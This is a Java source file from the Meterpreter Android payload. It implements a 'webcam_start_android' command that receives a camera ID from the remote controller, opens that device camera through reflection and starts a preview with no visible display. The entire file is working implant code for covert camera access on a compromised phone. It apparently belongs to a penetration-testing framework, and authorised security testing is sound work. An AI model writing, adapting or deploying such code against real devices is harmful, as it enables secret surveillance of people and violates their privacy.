
package com.metasploit.meterpreter.android;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.stdapi.webcam_audio_record;

import android.hardware.Camera;
import android.util.Log;

import java.lang.reflect.Method;

public class webcam_start_android extends webcam_audio_record implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_WEBCAM_INTERFACE_ID = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 2);

    public static Camera camera;

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {

        int camId = request.getIntValue(TLV_TYPE_WEBCAM_INTERFACE_ID);
                
        try {
            Class<?> cameraClass = Class.forName("android.hardware.Camera");
            Method cameraOpenMethod = cameraClass.getMethod("open", Integer.TYPE);
            if (cameraOpenMethod != null) {
                camera = (Camera)cameraOpenMethod.invoke(null, camId - 1);
            } else {
                camera = Camera.open();
            }
            camera.setPreviewDisplay(null);
            camera.startPreview();

        } catch (Exception e) {
            Log.e(getClass().getSimpleName(), "webcam error ", e);
        }

        return ERROR_SUCCESS;
    }
}
